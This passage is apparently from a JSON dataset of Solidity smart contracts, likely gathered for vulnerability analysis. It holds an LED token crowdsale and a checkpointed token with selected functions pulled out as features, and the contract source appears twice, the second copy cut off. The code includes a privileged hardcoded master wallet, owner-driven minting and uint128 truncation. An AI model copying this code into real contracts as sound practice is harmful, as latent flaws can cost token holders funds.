(bool) {\n uint256 current = now;\n bool presaleStarted = (current >= startTime || started);\n bool presaleNotEnded = current <= endTime;\n bool nonZeroPurchase = msg.value != 0;\n return nonZeroPurchase && presaleStarted && presaleNotEnded;\n }\n function totalSupply() public constant returns (uint256) {\n return ledToken.totalSupply();\n }\n function balanceOf(address _owner) public constant returns (uint256) {\n return ledToken.balanceOf(_owner);\n }\n function changeController(address _newController) public onlyOwner {\n require(isContract(_newController));\n ledToken.transferControl(_newController);\n }\n function enableMasterTransfers() public onlyOwner {\n ledToken.enableMasterTransfers(true);\n }\n function lockMasterTransfers() public onlyOwner {\n ledToken.enableMasterTransfers(false);\n }\n function forceStart() public onlyOwner {\n started = true;\n }\n function isContract(address _addr) constant internal returns(bool) {\n uint size;\n if (_addr == 0)\n return false;\n assembly {\n size := extcodesize(_addr)\n }\n return size>0;\n }\n modifier whenNotFinalized() {\n require(!finalized);\n _;\n }\n}\ncontract FirstSale is Crowdsale {\n uint256 public tokenCap = FIRSTSALE_TOKENCAP;\n uint256 public cap = tokenCap * DECIMALS_MULTIPLIER;\n uint256 public weiCap = tokenCap * FIRSTSALE_BASE_PRICE_IN_WEI;\n constructor(address _tokenAddress, uint256 _startTime, uint256 _endTime) public {\n startTime = _startTime;\n endTime = _endTime;\n ledToken = LedTokenInterface(_tokenAddress);\n assert(_tokenAddress != 0x0);\n assert(_startTime > 0);\n assert(_endTime > _startTime);\n }\n function() public payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable whenNotPaused whenNotFinalized {\n require(_beneficiary != 0x0);\n require(validPurchase());\n uint256 weiAmount = msg.value;\n require(weiAmount >= MIN_PURCHASE && weiAmount <= MAX_PURCHASE);\n uint256 priceInWei = FIRSTSALE_BASE_PRICE_IN_WEI;\n totalWeiRaised = totalWeiRaised.add(weiAmount);\n uint256 tokens = weiAmount.mul(DECIMALS_MULTIPLIER).div(priceInWei);\n tokensMinted = tokensMinted.add(tokens);\n require(tokensMinted < cap);\n contributors = contributors.add(1);\n ledToken.mint(_beneficiary, tokens);\n emit TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens);\n forwardFunds();\n }\n function getInfo() public view returns(uint256, uint256, string, bool, uint256, uint256, uint256,\n bool, uint256, uint256){\n uint256 decimals = 18;\n string memory symbol = \"LED\";\n bool transfersEnabled = ledToken.transfersEnabled();\n return (\n TOTAL_TOKENCAP,\n decimals,\n symbol,\n transfersEnabled,\n contributors,\n totalWeiRaised,\n tokenCap,\n started,\n startTime,\n endTime\n );\n }\n function finalize() public onlyOwner {\n require(paused);\n require(!finalized);\n surplusTokens = cap - tokensMinted;\n ledToken.mint(ledMultiSig, surplusTokens);\n ledToken.transferControl(owner);\n emit Finalized();\n finalized = true;\n }\n}\ncontract LedToken is Controllable {\n using SafeMath for uint256;\n LedTokenInterface public parentToken;\n TokenFactoryInterface public tokenFactory;\n string public name;\n string public symbol;\n string public version;\n uint8 public decimals;\n uint256 public parentSnapShotBlock;\n uint256 public creationBlock;\n bool public transfersEnabled;\n bool public masterTransfersEnabled;\n address public masterWallet = 0x865e785f98b621c5fdde70821ca7cea9eeb77ef4;\n struct Checkpoint {\n uint128 fromBlock;\n uint128 value;\n }\n Checkpoint[] totalSupplyHistory;\n mapping(address => Checkpoint[]) balances;\n mapping (address => mapping (address => uint)) allowed;\n bool public mintingFinished = false;\n bool public presaleBalancesLocked = false;\n uint256 public totalSupplyAtCheckpoint;\n event MintFinished();\n event NewCloneToken(address indexed cloneToken);\n event Approval(address indexed _owner, address indexed _spender, uint256 _amount);\n event Transfer(address indexed from, address indexed to, uint256 value);\n constructor(\n address _tokenFactory,\n address _parentToken,\n uint256 _parentSnapShotBlock,\n string _tokenName,\n string _tokenSymbol\n ) public {\n tokenFactory = TokenFactoryInterface(_tokenFactory);\n parentToken = LedTokenInterface(_parentToken);\n parentSnapShotBlock = _parentSnapShotBlock;\n name = _tokenName;\n symbol = _tokenSymbol;\n decimals = 18;\n transfersEnabled = false;\n masterTransfersEnabled = false;\n creationBlock = block.number;\n version = '0.1';\n }\n function totalSupply() public constant returns (uint256) {\n return totalSupplyAt(block.number);\n }\n function totalSupplyAt(uint256 _blockNumber) public constant returns(uint256) {\n if ((totalSupplyHistory.length == 0) || (totalSupplyHistory[0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0x0) {\n return parentToken.totalSupplyAt(min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(totalSupplyHistory, _blockNumber);\n }\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balanceOfAt(_owner, block.number);\n }\n function balanceOfAt(address _owner, uint256 _blockNumber) public constant returns (uint256) {\n if ((balances[_owner].length == 0) || (balances[_owner][0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0x0) {\n return parentToken.balanceOfAt(_owner, min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(balances[_owner], _blockNumber);\n }\n }\n function transfer(address _to, uint256 _amount) public returns (bool success) {\n return doTransfer(msg.sender, _to, _amount);\n }\n function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {\n require(allowed[_from][msg.sender] >= _amount);\n allowed[_from][msg.sender] -= _amount;\n return doTransfer(_from, _to, _amount);\n }\n function approve(address _spender, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n require((_amount == 0) || (allowed[msg.sender][_spender] == 0));\n allowed[msg.sender][_spender] = _amount;\n emit Approval(msg.sender, _spender, _amount);\n return true;\n }\n function approveAndCall(address _spender, uint256 _amount, bytes _extraData) public returns (bool success) {\n approve(_spender, _amount);\n ApproveAndCallReceiver(_spender).receiveApproval(\n msg.sender,\n _amount,\n this,\n _extraData\n );\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function doTransfer(address _from, address _to, uint256 _amount) internal returns(bool) {\n if (msg.sender != masterWallet) {\n require(transfersEnabled);\n } else {\n require(masterTransfersEnabled);\n }\n require(_amount > 0);\n require(parentSnapShotBlock < block.number);\n require((_to != address(0)) && (_to != address(this)));\n uint256 previousBalanceFrom = balanceOfAt(_from, block.number);\n require(previousBalanceFrom >= _amount);\n updateValueAtNow(balances[_from], previousBalanceFrom - _amount);\n uint256 previousBalanceTo = balanceOfAt(_to, block.number);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(balances[_to], previousBalanceTo + _amount);\n emit Transfer(_from, _to, _amount);\n return true;\n }\n function mint(address _owner, uint256 _amount) public onlyController canMint returns (bool) {\n uint256 curTotalSupply = totalSupply();\n uint256 previousBalanceTo = balanceOf(_owner);\n require(curTotalSupply + _amount >= curTotalSupply);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(totalSupplyHistory, curTotalSupply + _amount);\n updateValueAtNow(balances[_owner], previousBalanceTo + _amount);\n emit Transfer(0, _owner, _amount);\n return true;\n }\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function importPresaleBalances(address[] _addresses, uint256[] _balances) public onlyController returns (bool) {\n require(presaleBalancesLocked == false);\n for (uint256 i = 0; i < _addresses.length; i++) {\n totalSupplyAtCheckpoint += _balances[i];\n updateValueAtNow(balances[_addresses[i]], _balances[i]);\n updateValueAtNow(totalSupplyHistory, totalSupplyAtCheckpoint);\n emit Transfer(0, _addresses[i], _balances[i]);\n }\n return true;\n }\n function lockPresaleBalances() public onlyController returns (bool) {\n presaleBalancesLocked = true;\n return true;\n }\n function finishMinting() public onlyController returns (bool) {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n function enableTransfers(bool _value) public onlyController {\n transfersEnabled = _value;\n }\n function enableMasterTransfers(bool _value) public onlyController {\n masterTransfersEnabled = _value;\n }\n function getValueAt(Checkpoint[] storage _checkpoints, uint256 _block) constant internal returns (uint256) {\n if (_checkpoints.length == 0)\n return 0;\n if (_block >= _checkpoints[_checkpoints.length-1].fromBlock)\n return _checkpoints[_checkpoints.length-1].value;\n if (_block < _checkpoints[0].fromBlock)\n return 0;\n uint256 min = 0;\n uint256 max = _checkpoints.length-1;\n while (max > min) {\n uint256 mid = (max + min + 1) / 2;\n if (_checkpoints[mid].fromBlock<=_block) {\n min = mid;\n } else {\n max = mid-1;\n }\n }\n return _checkpoints[min].value;\n }\n function updateValueAtNow(Checkpoint[] storage _checkpoints, uint256 _value) internal {\n if ((_checkpoints.length == 0) || (_checkpoints[_checkpoints.length-1].fromBlock < block.number)) {\n Checkpoint storage newCheckPoint = _checkpoints[_checkpoints.length++];\n newCheckPoint.fromBlock = uint128(block.number);\n newCheckPoint.value = uint128(_value);\n } else {\n Checkpoint storage oldCheckPoint = _checkpoints[_checkpoints.length-1];\n oldCheckPoint.value = uint128(_value);\n }\n }\n function min(uint256 a, uint256 b) internal pure returns (uint) {\n return a < b ? a : b;\n }\n function createCloneToken(uint256 _snapshotBlock, string _name, string _symbol) public returns(address) {\n if (_snapshotBlock == 0) {\n _snapshotBlock = block.number;\n }\n if (_snapshotBlock > block.number) {\n _snapshotBlock = block.number;\n }\n LedToken cloneToken = tokenFactory.createCloneToken(\n this,\n _snapshotBlock,\n _name,\n _symbol\n );\n cloneToken.transferControl(msg.sender);\n emit NewCloneToken(address(cloneToken));\n return address(cloneToken);\n }\n}\ncontract LedTokenInterface is Controllable {\n bool public transfersEnabled;\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n event ClaimedTokens(address indexed _token, address indexed _owner, uint _amount);\n event NewCloneToken(address indexed _cloneToken, uint _snapshotBlock);\n event Approval(address indexed _owner, address indexed _spender, uint256 _amount);\n event Transfer(address indexed from, address indexed to, uint256 value);\n function totalSupply() public constant returns (uint);\n function totalSupplyAt(uint _blockNumber) public constant returns(uint);\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function balanceOfAt(address _owner, uint _blockNumber) public constant returns (uint);\n function transfer(address _to, uint256 _amount) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success);\n function approve(address _spender, uint256 _amount) public returns (bool success);\n function approveAndCall(address _spender, uint256 _amount, bytes _extraData) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n function mint(address _owner, uint _amount) public returns (bool);\n function importPresaleBalances(address[] _addresses, uint256[] _balances, address _presaleAddress) public returns (bool);\n function lockPresaleBalances() public returns (bool);\n function finishMinting() public returns (bool);\n function enableTransfers(bool _value) public;\n function enableMasterTransfers(bool _value) public;\n function createCloneToken(uint _snapshotBlock, string _cloneTokenName, string _cloneTokenSymbol) public returns (address);\n}\ncontract Presale is Crowdsale {\n uint256 public tokenCap = PRESALE_TOKENCAP;\n uint256 public cap = tokenCap * DECIMALS_MULTIPLIER;\n uint256 public weiCap = tokenCap * PRESALE_BASE_PRICE_IN_WEI;\n constructor(address _tokenAddress, uint256 _startTime, uint256 _endTime) public {\n startTime = _startTime;\n endTime = _endTime;\n ledToken = LedTokenInterface(_tokenAddress);\n assert(_tokenAddress != 0x0);\n assert(_startTime > 0);\n assert(_endTime > _startTime);\n }\n function() public payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable whenNotPaused whenNotFinalized {\n require(_beneficiary != 0x0);\n require(validPurchase());\n uint256 weiAmount = msg.value;\n require(weiAmount >= MIN_PURCHASE_OTHERSALES && weiAmount <= MAX_PURCHASE);\n uint256 priceInWei = PRESALE_BASE_PRICE_IN_WEI;\n totalWeiRaised = totalWeiRaised.add(weiAmount);\n uint256 bonusPercentage = determineBonus(weiAmount);\n uint256 bonusTokens;\n uint256 initialTokens = weiAmount.mul(DECIMALS_MULTIPLIER).div(priceInWei);\n if(bonusPercentage>0){\n uint256 initialDivided = initialTokens.div(100);\n bonusTokens = initialDivided.mul(bonusPercentage);\n } else {\n bonusTokens = 0;\n }\n uint256 tokens = initialTokens.add(bonusTokens);\n tokensMinted = tokensMinted.add(tokens);\n require(tokensMinted < cap);\n contributors = contributors.add(1);\n ledToken.mint(_beneficiary, tokens);\n emit TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens);\n forwardFunds();\n }\n function determineBonus(uint256 _wei) public view returns (uint256) {\n if(_wei > PRESALE_LEVEL_1) {\n if(_wei > PRESALE_LEVEL_2) {\n if(_wei > PRESALE_LEVEL_3) {\n if(_wei > PRESALE_LEVEL_4) {\n if(_wei > PRESALE_LEVEL_5) {\n return PRESALE_PERCENTAGE_5;\n } else {\n return PRESALE_PERCENTAGE_4;\n }\n } else {\n return PRESALE_PERCENTAGE_3;\n }\n } else {\n return PRESALE_PERCENTAGE_2;\n }\n } else {\n return PRESALE_PERCENTAGE_1;\n }\n } else {\n return 0;\n }\n }\n function finalize() public onlyOwner {\n require(paused);\n require(!finalized);\n surplusTokens = cap - tokensMinted;\n ledToken.mint(ledMultiSig, surplusTokens);\n ledToken.transferControl(owner);\n emit Finalized();\n finalized = true;\n }\n function getInfo() public view returns(uint256, uint256, string, bool, uint256, uint256, uint256,\n bool, uint256, uint256){\n uint256 decimals = 18;\n string memory symbol = \"LED\";\n bool transfersEnabled = ledToken.transfersEnabled();\n return (\n TOTAL_TOKENCAP,\n decimals,\n symbol,\n transfersEnabled,\n contributors,\n totalWeiRaised,\n tokenCap,\n started,\n startTime,\n endTime\n );\n }\n function getInfoLevels() public view returns(uint256, uint256, uint256, uint256, uint256, uint256,\n uint256, uint256, uint256, uint256){\n return (\n PRESALE_LEVEL_1,\n PRESALE_LEVEL_2,\n PRESALE_LEVEL_3,\n PRESALE_LEVEL_4,\n PRESALE_LEVEL_5,\n PRESALE_PERCENTAGE_1,\n PRESALE_PERCENTAGE_2,\n PRESALE_PERCENTAGE_3,\n PRESALE_PERCENTAGE_4,\n PRESALE_PERCENTAGE_5\n );\n }\n}\ncontract PrivateSale is Crowdsale {\n uint256 public tokenCap = PRIVATESALE_TOKENCAP;\n uint256 public cap = tokenCap * DECIMALS_MULTIPLIER;\n uint256 public weiCap = tokenCap * PRIVATESALE_BASE_PRICE_IN_WEI;\n constructor(address _tokenAddress, uint256 _startTime, uint256 _endTime) public {\n startTime = _startTime;\n endTime = _endTime;\n ledToken = LedTokenInterface(_tokenAddress);\n assert(_tokenAddress != 0x0);\n assert(_startTime > 0);\n assert(_endTime > _startTime);\n }\n function() public payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable whenNotPaused whenNotFinalized {\n require(_beneficiary != 0x0);\n require(validPurchase());\n uint256 weiAmount = msg.value;\n require(weiAmount >= MIN_PURCHASE_OTHERSALES && weiAmount <= MAX_PURCHASE);\n uint256 priceInWei = PRIVATESALE_BASE_PRICE_IN_WEI;\n totalWeiRaised = totalWeiRaised.add(weiAmount);\n uint256 tokens = weiAmount.mul(DECIMALS_MULTIPLIER).div(priceInWei);\n tokensMinted = tokensMinted.add(tokens);\n require(tokensMinted < cap);\n contributors = contributors.add(1);\n ledToken.mint(_beneficiary, tokens);\n emit TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens);\n forwardFunds();\n }\n function finalize() public onlyOwner {\n require(paused);\n require(!finalized);\n surplusTokens = cap - tokensMinted;\n ledToken.mint(ledMultiSig, surplusTokens);\n ledToken.transferControl(owner);\n emit Finalized();\n finalized = true;\n }\n function getInfo() public view returns(uint256, uint256, string, bool, uint256, uint256, uint256,\n bool, uint256, uint256){\n uint256 decimals = 18;\n string memory symbol = \"LED\";\n bool transfersEnabled = ledToken.transfersEnabled();\n return (\n TOTAL_TOKENCAP,\n decimals,\n symbol,\n transfersEnabled,\n contributors,\n totalWeiRaised,\n tokenCap,\n started,\n startTime,\n endTime\n );\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract TokenFactory {\n function createCloneToken(\n address _parentToken,\n uint _snapshotBlock,\n string _tokenName,\n string _tokenSymbol\n ) public returns (LedToken) {\n LedToken newToken = new LedToken(\n this,\n _parentToken,\n _snapshotBlock,\n _tokenName,\n _tokenSymbol\n );\n newToken.transferControl(msg.sender);\n return newToken;\n }\n}\ncontract TokenFactoryInterface {\n function createCloneToken(\n address _parentToken,\n uint _snapshotBlock,\n string _tokenName,\n string _tokenSymbol\n ) public returns (LedToken newToken);\n}\ncontract TokenSale is Crowdsale {\n uint256 public tokenCap = ICO_TOKENCAP;\n uint256 public cap = tokenCap * DECIMALS_MULTIPLIER;\n uint256 public weiCap = tokenCap * ICO_BASE_PRICE_IN_WEI;\n uint256 public allocatedTokens;\n constructor(address _tokenAddress, uint256 _startTime, uint256 _endTime) public {\n startTime = _startTime;\n endTime = _endTime;\n ledToken = LedTokenInterface(_tokenAddress);\n assert(_tokenAddress != 0x0);\n assert(_startTime > 0);\n assert(_endTime > _startTime);\n }\n function() public payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable whenNotPaused whenNotFinalized {\n require(_beneficiary != 0x0);\n require(validPurchase());\n uint256 weiAmount = msg.value;\n require(weiAmount >= MIN_PURCHASE_OTHERSALES && weiAmount <= MAX_PURCHASE);\n uint256 priceInWei = ICO_BASE_PRICE_IN_WEI;\n totalWeiRaised = totalWeiRaised.add(weiAmount);\n uint256 bonusPercentage = determineBonus(weiAmount);\n uint256 bonusTokens;\n uint256 initialTokens = weiAmount.mul(DECIMALS_MULTIPLIER).div(priceInWei);\n if(bonusPercentage>0){\n uint256 initialDivided = initialTokens.div(100);\n bonusTokens = initialDivided.mul(bonusPercentage);\n } else {\n bonusTokens = 0;\n }\n uint256 tokens = initialTokens.add(bonusTokens);\n tokensMinted = tokensMinted.add(tokens);\n require(tokensMinted < cap);\n contributors = contributors.add(1);\n ledToken.mint(_beneficiary, tokens);\n emit TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens);\n forwardFunds();\n }\n function determineBonus(uint256 _wei) public view returns (uint256) {\n if(_wei > ICO_LEVEL_1) {\n if(_wei > ICO_LEVEL_2) {\n if(_wei > ICO_LEVEL_3) {\n if(_wei > ICO_LEVEL_4) {\n if(_wei > ICO_LEVEL_5) {\n return ICO_PERCENTAGE_5;\n } else {\n return ICO_PERCENTAGE_4;\n }\n } else {\n return ICO_PERCENTAGE_3;\n }\n } else {\n return ICO_PERCENTAGE_2;\n }\n } else {\n return ICO_PERCENTAGE_1;\n }\n } else {\n return 0;\n }\n }\n function allocateLedTokens() public onlyOwner whenNotFinalized {\n require(!ledTokensAllocated);\n allocatedTokens = LEDTEAM_TOKENS.mul(DECIMALS_MULTIPLIER);\n ledToken.mint(ledMultiSig, allocatedTokens);\n ledTokensAllocated = true;\n }\n function finalize() public onlyOwner {\n require(paused);\n require(ledTokensAllocated);\n surplusTokens = cap - tokensMinted;\n ledToken.mint(ledMultiSig, surplusTokens);\n ledToken.finishMinting();\n ledToken.enableTransfers(true);\n emit Finalized();\n finalized = true;\n }\n function getInfo() public view returns(uint256, uint256, string, bool, uint256, uint256, uint256,\n bool, uint256, uint256){\n uint256 decimals = 18;\n string memory symbol = \"LED\";\n bool transfersEnabled = ledToken.transfersEnabled();\n return (\n TOTAL_TOKENCAP,\n decimals,\n symbol,\n transfersEnabled,\n contributors,\n totalWeiRaised,\n tokenCap,\n started,\n startTime,\n endTime\n );\n }\n function getInfoLevels() public view returns(uint256, uint256, uint256, uint256, uint256, uint256,\n uint256, uint256, uint256, uint256){\n return (\n ICO_LEVEL_1,\n ICO_LEVEL_2,\n ICO_LEVEL_3,\n ICO_LEVEL_4,\n ICO_LEVEL_5,\n ICO_PERCENTAGE_1,\n ICO_PERCENTAGE_2,\n ICO_PERCENTAGE_3,\n ICO_PERCENTAGE_4,\n ICO_PERCENTAGE_5\n );\n }\n}",
  "extract_feature": [
    "function totalSupply() public constant returns (uint256) {\nreturn totalSupplyAt(block.number);\n}",
    "function balanceOf(address _owner) public constant returns (uint256 balance) {\nreturn balanceOfAt(_owner, block.number);\n}",
    "function doTransfer(address _from, address _to, uint256 _amount) internal returns(bool) {\nif (msg.sender != masterWallet) {\nrequire(transfersEnabled);\n} else {\nrequire(masterTransfersEnabled);\n}\nrequire(_amount > 0);\nrequire(parentSnapShotBlock < block.number);\nrequire((_to != address(0)) && (_to != address(this)));\nuint256 previousBalanceFrom = balanceOfAt(_from, block.number);\nrequire(previousBalanceFrom >= _amount);\nupdateValueAtNow(balances[_from], previousBalanceFrom - _amount);\nuint256 previousBalanceTo = balanceOfAt(_to, block.number);\nrequire(previousBalanceTo + _amount >= previousBalanceTo);\nupdateValueAtNow(balances[_to], previousBalanceTo + _amount);\nemit Transfer(_from, _to, _amount);\nreturn true;\n}",
    "function updateValueAtNow(Checkpoint[] storage _checkpoints, uint256 _value) internal {\nif ((_checkpoints.length == 0) || (_checkpoints[_checkpoints.length-1].fromBlock < block.number)) {\nCheckpoint storage newCheckPoint = _checkpoints[_checkpoints.length++];\nnewCheckPoint.fromBlock = uint128(block.number);\nnewCheckPoint.value = uint128(_value);\n} else {\nCheckpoint storage oldCheckPoint = _checkpoints[_checkpoints.length-1];\noldCheckPoint.value = uint128(_value);\n}\n}",
    "function createCloneToken(uint256 _snapshotBlock, string _name, string _symbol) public returns(address) {\nif (_snapshotBlock == 0) {\n_snapshotBlock = block.number;\n}\nif (_snapshotBlock > block.number) {\n_snapshotBlock = block.number;\n}\nLedToken cloneToken = tokenFactory.createCloneToken(\nthis,\n_snapshotBlock,\n_name,\n_symbol\n);\ncloneToken.transferControl(msg.sender);\nemit NewCloneToken(address(cloneToken));\nreturn address(cloneToken);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b62"
  },
  "filename": "2978.sol",
  "content": "pragma solidity ^0.4.24;\ncontract TokenInfo {\n uint256 public constant PRIVATESALE_BASE_PRICE_IN_WEI = 200000000000000;\n uint256 public constant PRESALE_BASE_PRICE_IN_WEI = 600000000000000;\n uint256 public constant ICO_BASE_PRICE_IN_WEI = 800000000000000;\n uint256 public constant FIRSTSALE_BASE_PRICE_IN_WEI = 200000000000000;\n uint256 public constant MIN_PURCHASE_OTHERSALES = 80000000000000000;\n uint256 public constant MIN_PURCHASE = 1000000000000000000;\n uint256 public constant MAX_PURCHASE = 1000000000000000000000;\n uint256 public constant PRESALE_PERCENTAGE_1 = 10;\n uint256 public constant PRESALE_PERCENTAGE_2 = 15;\n uint256 public constant PRESALE_PERCENTAGE_3 = 20;\n uint256 public constant PRESALE_PERCENTAGE_4 = 25;\n uint256 public constant PRESALE_PERCENTAGE_5 = 35;\n uint256 public constant ICO_PERCENTAGE_1 = 5;\n uint256 public constant ICO_PERCENTAGE_2 = 10;\n uint256 public constant ICO_PERCENTAGE_3 = 15;\n uint256 public constant ICO_PERCENTAGE_4 = 20;\n uint256 public constant ICO_PERCENTAGE_5 = 25;\n uint256 public constant PRESALE_LEVEL_1 = 5000000000000000000;\n uint256 public constant PRESALE_LEVEL_2 = 10000000000000000000;\n uint256 public constant PRESALE_LEVEL_3 = 15000000000000000000;\n uint256 public constant PRESALE_LEVEL_4 = 20000000000000000000;\n uint256 public constant PRESALE_LEVEL_5 = 25000000000000000000;\n uint256 public constant ICO_LEVEL_1 = 6666666666666666666;\n uint256 public constant ICO_LEVEL_2 = 13333333333333333333;\n uint256 public constant ICO_LEVEL_3 = 20000000000000000000;\n uint256 public constant ICO_LEVEL_4 = 26666666666666666666;\n uint256 public constant ICO_LEVEL_5 = 33333333333333333333;\n uint256 public constant PRIVATESALE_TOKENCAP = 18750000;\n uint256 public constant PRESALE_TOKENCAP = 18750000;\n uint256 public constant ICO_TOKENCAP = 22500000;\n uint256 public constant FIRSTSALE_TOKENCAP = 5000000;\n uint256 public constant LEDTEAM_TOKENS = 35000000;\n uint256 public constant TOTAL_TOKENCAP = 100000000;\n uint256 public constant DECIMALS_MULTIPLIER = 1 ether;\n address public constant LED_MULTISIG = 0x865e785f98b621c5fdde70821ca7cea9eeb77ef4;\n}\ncontract Ownable {\n address public owner;\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n constructor() public {}\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused {\n require(paused);\n _;\n }\n function pause() public onlyOwner whenNotPaused returns (bool) {\n paused = true;\n emit Pause();\n return true;\n }\n function unpause() public onlyOwner whenPaused returns (bool) {\n paused = false;\n emit Unpause();\n return true;\n }\n}\ncontract ApproveAndCallReceiver {\n function receiveApproval(address from, uint256 _amount, address _token, bytes _data) public;\n}\ncontract Controllable {\n address public controller;\n constructor() public {\n controller = msg.sender;\n }\n modifier onlyController() {\n require(msg.sender == controller);\n _;\n }\n function transferControl(address newController) public onlyController {\n if (newController != address(0)) {\n controller = newController;\n }\n }\n}\ncontract ControllerInterface {\n function proxyPayment(address _owner) public payable returns(bool);\n function onTransfer(address _from, address _to, uint _amount) public returns(bool);\n function onApprove(address _owner, address _spender, uint _amount) public returns(bool);\n}\ncontract ERC20 {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256);\n function transfer(address _to, uint256 _value) public returns (bool);\n function transferFrom(address _from, address _to, uint256 _amount) public returns (bool);\n function approve(address _spender, uint256 _amount) public returns (bool);\n function allowance(address _owner, address _spender) public constant returns (uint256);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract Crowdsale is Pausable, TokenInfo {\n using SafeMath for uint256;\n LedTokenInterface public ledToken;\n uint256 public startTime;\n uint256 public endTime;\n uint256 public totalWeiRaised;\n uint256 public tokensMinted;\n uint256 public totalSupply;\n uint256 public contributors;\n uint256 public surplusTokens;\n bool public finalized;\n bool public ledTokensAllocated;\n address public ledMultiSig = LED_MULTISIG;\n bool public started = false;\n event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);\n event NewClonedToken(address indexed _cloneToken);\n event OnTransfer(address _from, address _to, uint _amount);\n event OnApprove(address _owner, address _spender, uint _amount);\n event LogInt(string _name, uint256 _value);\n event Finalized();\n function forwardFunds() internal {\n ledMultiSig.transfer(msg.value);\n }\n function validPurchase() internal constant returns (bool) {\n uint256 current = now;\n bool presaleStarted = (current >= startTime || started);\n bool presaleNotEnded = current <= endTime;\n bool nonZeroPurchase = msg.value != 0;\n return nonZeroPurchase && presaleStarted && presaleNotEnded;\n }\n function totalSupply() public constant returns (uint256) {\n return ledToken.totalSupply();\n }\n function balanceOf(address _owner) public constant returns (uint256) {\n return ledToken.balanceOf(_owner);\n }\n function changeController(address _newController) public onlyOwner {\n require(isContract(_newController));\n ledToken.transferControl(_newController);\n }\n function enableMasterTransfers() public onlyOwner {\n ledToken.enableMasterTransfers(true);\n }\n function lockMasterTransfers() public onlyOwner {\n ledToken.enableMasterTransfers(false);\n }\n function forceStart() public onlyOwner {\n started = true;\n }\n function isContract(address _addr) constant internal returns(bool) {\n uint size;\n if (_addr == 0)\n return false;\n assembly {\n size := extcodesize(_addr)\n }\n return size>0;\n }\n modifier whenNotFinalized() {\n require(!finalized);\n _;\n }\n}\ncontract FirstSale is Crowdsale {\n uint256 public tokenCap = FIRSTSALE_TOKENCAP;\n uint256 public cap = tokenCap * DECIMALS_MULTIPLIER;\n uint256 public weiCap = tokenCap * FIRSTSALE_BASE_PRICE_IN_WEI;\n constructor(address _tokenAddress, uint256 _startTime, uint256 _endTime) public {\n startTime = _startTime;\n endTime = _endTime;\n ledToken = LedTokenInterface(_tokenAddress);\n assert(_tokenAddress != 0x0);\n assert(_startTime > 0);\n assert(_endTime > _startTime);\n }\n function() public payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable whenNotPaused whenNotFinalized {\n require(_beneficiary != 0x0);\n require(validPurchase());\n uint256 weiAmount = msg.value;\n require(weiAmount >= MIN_PURCHASE && weiAmount <= MAX_PURCHASE);\n uint256 priceInWei = FIRSTSALE_BASE_PRICE_IN_WEI;\n totalWeiRaised = totalWeiRaised.add(weiAmount);\n uint256 tokens = weiAmount.mul(DECIMALS_MULTIPLIER).div(priceInWei);\n tokensMinted = tokensMinted.add(tokens);\n require(tokensMinted < cap);\n contributors = contributors.add(1);\n ledToken.mint(_beneficiary, tokens);\n emit TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens);\n forwardFunds();\n }\n function getInfo() public view returns(uint256, uint256, string, bool, uint256, uint256, uint256,\n bool, uint256, uint256){\n uint256 decimals = 18;\n string memory symbol = \"LED\";\n bool transfersEnabled = ledToken.transfersEnabled();\n return (\n TOTAL_TOKENCAP,\n decimals,\n symbol,\n transfersEnabled,\n contributors,\n totalWeiRaised,\n tokenCap,\n started,\n startTime,\n endTime\n );\n }\n function finalize() public onlyOwner {\n require(paused);\n require(!finalized);\n surplusTokens = cap - tokensMinted;\n ledToken.mint(ledMultiSig, surplusTokens);\n ledToken.transferControl(owner);\n emit Finalized();\n finalized = true;\n }\n}\ncontract LedToken is Controllable {\n using SafeMath for uint256;\n LedTokenInterface public parentToken;\n TokenFactoryInterface public tokenFactory;\n string public name;\n string public symbol;\n string public version;\n uint8 public decimals;\n uint256 public parentSnapShotBlock;\n uint256 public creationBlock;\n bool public transfersEnabled;\n bool public 